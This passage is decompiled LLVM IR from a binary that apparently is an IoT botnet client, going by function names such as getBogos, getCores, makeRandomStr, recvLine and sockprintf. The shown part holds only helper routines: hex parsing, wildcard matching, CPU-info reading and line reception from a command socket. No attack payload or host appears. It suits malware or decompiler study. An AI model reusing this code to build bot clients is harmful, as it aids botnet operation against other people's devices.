  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9308, { 1, 0 }
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1e520.41 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9664, i32* @r2, align 4
  %v3_9674 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1e920.43 to i32), i32 0)
  %v2_982c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9694 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9824

dec_label_pc_9684:                                ; preds = %dec_label_pc_9824
  %v2_9694 = call i32 @uppercase(i8* %v1_9694)
  %v4_96ac = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e930.45, i32 0, i32 0))
  %v9_96c4 = icmp eq i32 %v4_96ac, %v2_982c
  br i1 %v9_96c4, label %dec_label_pc_96cc, label %dec_label_pc_9808

dec_label_pc_96cc:                                ; preds = %dec_label_pc_9684
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96e4:                                ; preds = %dec_label_pc_9710, %dec_label_pc_9700, %dec_label_pc_96f0
  %v1_96e8 = add i32 %v4_96f0, 1
  %v5_96ec = inttoptr i32 %v1_96e8 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96cc, %dec_label_pc_96e4
  %storemerge2 = phi i8* [ %v5_96ec, %dec_label_pc_96e4 ], [ %tmp21, %dec_label_pc_96cc ]
  %v4_96f0 = ptrtoint i8* %storemerge2 to i32
  %v2_96f4 = load i8, i8* %storemerge2, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 32
  br i1 %v7_96f8, label %dec_label_pc_96e4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96f0
  %v2_9704 = load i8, i8* %storemerge2, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 9
  br i1 %v7_9708, label %dec_label_pc_96e4, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 58
  br i1 %v7_9718, label %dec_label_pc_96e4, label %dec_label_pc_9748.preheader

dec_label_pc_9748.preheader:                      ; preds = %dec_label_pc_9710
  %v1_974c = add i32 %v4_96f0, -1
  br label %dec_label_pc_9748

dec_label_pc_9724:                                ; preds = %dec_label_pc_9770, %dec_label_pc_9748
  %v3_9734 = call i32 @strlen(i8* %storemerge2)
  %v2_973c = add i32 %v1_974c, %v3_9734
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 0, i8* %v3_9744, align 1
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %dec_label_pc_9748.preheader, %dec_label_pc_9724
  %v3_9758 = call i32 @strlen(i8* %storemerge2)
  %v2_9760 = add i32 %v1_974c, %v3_9758
  %v1_9764 = inttoptr i32 %v2_9760 to i8*
  %v2_9764 = load i8, i8* %v1_9764, align 1
  %v7_9768 = icmp eq i8 %v2_9764, 13
  br i1 %v7_9768, label %dec_label_pc_9724, label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9748
  store i32 %v1_974c, i32* @r4, align 4
  %v3_9780 = call i32 @strlen(i8* %storemerge2)
  %v0_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v0_9788, %v3_9780
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 10
  br i1 %v7_9790, label %dec_label_pc_9724, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9770
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97a4 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v2_97ac = icmp eq i32 %v2_97a4, 0
  br i1 %v2_97ac, label %dec_label_pc_97d0, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9798
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97c0 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v3_97cc = inttoptr i32 %v2_97c0 to i8*
  store i8 0, i8* %v3_97cc, align 1
  br label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_9798, %dec_label_pc_97b4
  store i32 %v4_96f0, i32* @r1, align 4
  %v2_97ec = inttoptr i32 %arg1 to i8*
  %v3_97ec = call i32 @strcpy(i8* %v2_97ec, i32 %v4_96f0)
  %v1_97f4 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9808:                                ; preds = %dec_label_pc_9684
  store i32 4096, i32* @r2, align 4
  %v3_9820 = call i32 @__GI_memset(i8* %v1_9694, i32 0)
  br label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %entry, %dec_label_pc_9808
  %v4_983c = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v3_9674, i32 %v2_982c)
  %v2_9844 = icmp eq i32 %v4_983c, 0
  br i1 %v2_9844, label %dec_label_pc_984c, label %dec_label_pc_9684

dec_label_pc_984c:                                ; preds = %dec_label_pc_9824
  %v1_9850 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_97d0, %dec_label_pc_984c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_984c ], [ 0, %dec_label_pc_97d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_974c, { 2, 1, 0 }
  uselistorder i32 %v4_96f0, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9674, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97d0, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
  uselistorder label %dec_label_pc_96f0, { 1, 0 }
}

define i32 @getCores(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98a4 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1e920.43 to i32), i32 0)
  %v1_98c4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9920

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9920
  %v2_98c4 = call i32 @uppercase(i8* %v1_98c4)
  %v4_98dc = call i32 @strstr(i32 %v2_9890, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e930.45, i32 0, i32 0))
  %v9_98f0 = icmp eq i32 %v4_98dc, %v2_9890
  br i1 %v9_98f0, label %dec_label_pc_98f8, label %dec_label_pc_9904

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98b4
  %v1_98fc = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_98f8
  %stack_var_-24.0 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %stack_var_-24.1, %dec_label_pc_98b4 ]
  store i32 4096, i32* @r2, align 4
  %v3_991c = call i32 @__GI_memset(i8* %v1_98c4, i32 0)
  br label %dec_label_pc_9920

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9904
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9904 ]
  %v4_9938 = call i32 @fdgets(i32 %v2_9890, i32 4096, i32 %v3_98a4, i32 %v2_9890)
  %v2_9940 = icmp eq i32 %v4_9938, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_98b4

dec_label_pc_9948:                                ; preds = %dec_label_pc_9920
  %v1_994c = call i32 @__GI_close(i32 %v3_98a4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9890, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9970 = load i32, i32* @r4, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  %v0_997c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a1024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a1024, label %dec_label_pc_9998, label %dec_label_pc_9a14

dec_label_pc_9998:                                ; preds = %entry, %dec_label_pc_9998
  %storemerge725 = phi i32 [ %v1_99fc, %dec_label_pc_9998 ], [ 0, %entry ]
  %v2_99a4 = add i32 %storemerge725, %v0_997c
  store i32 %v2_99a4, i32* @r4, align 4
  %v0_99a8 = call i32 @rand_cmwc()
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v3_99b8 = udiv i32 %v0_99a8, 26
  %tmp = mul nsw i32 %v3_99b8, -2
  %v2_99dc = add i32 %v0_99a8, %tmp
  %fold = add i32 %v2_99dc, 65
  %v1_99f4 = trunc i32 %fold to i8
  %v2_99f4 = load i32, i32* @r4, align 4
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  store i8 %v1_99f4, i8* %v3_99f4, align 1
  %v1_99fc = add nuw nsw i32 %storemerge725, 1
  %v5_9a10 = icmp slt i32 %v1_99fc, %arg2
  br i1 %v5_9a10, label %dec_label_pc_9998, label %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge

dec_label_pc_9a04.dec_label_pc_9a14_crit_edge:    ; preds = %dec_label_pc_9998
  %v1_9a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge, %entry
  %v1_9a1c = phi i32 [ %v1_9a1c.pre, %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge ], [ %v0_997c, %entry ]
  store i32 %v3_9970, i32* @r4, align 4
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9a1c

; uselistorder directives
  uselistorder i32 %v1_99fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9998, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a28 = load i32, i32* @fp, align 4
  store i32 %v3_9a28, i32* %stack_var_-16, align 4
  store i32 39472, i32* %stack_var_-4, align 4
  %v2_9a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a2c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9a50 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge527, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp52, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a28 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -160
  %v2_9abc = add i32 %v2_9ab8, %v13_9a28
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9b00 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9b14 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9b28 = icmp sgt i32 %v5_9b14, 0
  br i1 %v5_9b28, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c28.preheader

dec_label_pc_9c28.preheader:                      ; preds = %dec_label_pc_9aa0
  %v7_9c3023 = icmp slt i32 %tmp33, 10
  br i1 %v7_9c3023, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9b68.lr.ph:                          ; preds = %dec_label_pc_9c28.preheader, %dec_label_pc_9c1c
  %stack_var_-44.024 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ %tmp33, %dec_label_pc_9c28.preheader ]
  %v2_9b34 = load i32, i32* @global_var_299a0.50, align 4
  %v3_9b40 = call i32 @sockprintf(i32 %v2_9b34, i32 ptrtoint ([5 x i8]* @global_var_1e93c.52 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b68.lr.ph, %dec_label_pc_9b68
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9b68.lr.ph ], [ %v1_9b7c, %dec_label_pc_9b68 ]
  %v5_9b74 = mul nuw nsw i32 %storemerge615, 4
  %v6_9b74 = add i32 %v5_9b74, %v2_9a64
  %v7_9b74 = inttoptr i32 %v6_9b74 to i32*
  store i32 0, i32* %v7_9b74, align 4
  %v1_9b7c = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9b7c, 32
  br i1 %tmp53, label %dec_label_pc_9b68, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b68
  %v2_9bb0 = load i32, i32* %v1_9ac0, align 4
  %v2_9bc4 = or i32 %v2_9bb0, %v6_9ad0
  store i32 %v2_9bc4, i32* %v1_9ac0, align 4
  store i32 0, i32* @r2, align 4
  %v5_9c04 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9c18 = icmp sgt i32 %v5_9c04, 0
  br i1 %v5_9c18, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9b90
  %v1_9c20 = add nsw i32 %stack_var_-44.024, 1
  %v7_9c30 = icmp slt i32 %v1_9c20, 10
  br i1 %v7_9c30, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9cbc.preheader:                      ; preds = %dec_label_pc_9c1c, %dec_label_pc_9b90, %dec_label_pc_9c28.preheader, %dec_label_pc_9aa0
  %v2_9c50 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cc457 = icmp sgt i32 %arg3, 1
  %v2_9cdc59 = icmp eq i1 %not.v7_9cc457, false
  br i1 %v2_9cdc59, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9cbc.preheader, %dec_label_pc_9cb0
  %v1_9cc062.in = phi i32 [ %v1_9cc062, %dec_label_pc_9cb0 ], [ %arg3, %dec_label_pc_9cbc.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %arg2, %dec_label_pc_9cbc.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9cb4, %dec_label_pc_9cb0 ], [ 0, %dec_label_pc_9cbc.preheader ]
  %v1_9cc062 = add i32 %v1_9cc062.in, -1
  %v2_9c4c = load i32, i32* @global_var_299a0.50, align 4
  %v5_9c64 = call i32 @__libc_recv(i32 %v2_9c4c, i32 %v2_9c50, i32 1, i32 0, i32 %v1_9cc062)
  %v7_9c6c = icmp eq i32 %v5_9c64, 1
  br i1 %v7_9c6c, label %dec_label_pc_9c8c, label %dec_label_pc_9c74

dec_label_pc_9c74:                                ; preds = %dec_label_pc_9c48
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c48
  %v3_9c8c = load i8, i8* %stack_var_-185, align 1
  %v4_9c90 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9c8c, i8* %stack_var_-40.061, align 1
  %v1_9c9c = add i32 %v4_9c90, 1
  %v5_9ca0 = inttoptr i32 %v1_9c9c to i8*
  %v3_9ca4 = load i8, i8* %stack_var_-185, align 1
  %v7_9ca8 = icmp eq i8 %v3_9ca4, 10
  br i1 %v7_9ca8, label %dec_label_pc_9ce4, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c8c
  %v1_9cb4 = add i32 %stack_var_-36.060, 1
  %not.v7_9cc4 = icmp sgt i32 %v1_9cc062, 1
  %v2_9cdc = icmp eq i1 %not.v7_9cc4, false
  br i1 %v2_9cdc, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c8c, %dec_label_pc_9cb0, %dec_label_pc_9cbc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cbc.preheader ], [ %v1_9cb4, %dec_label_pc_9cb0 ], [ %stack_var_-36.060, %dec_label_pc_9c8c ]
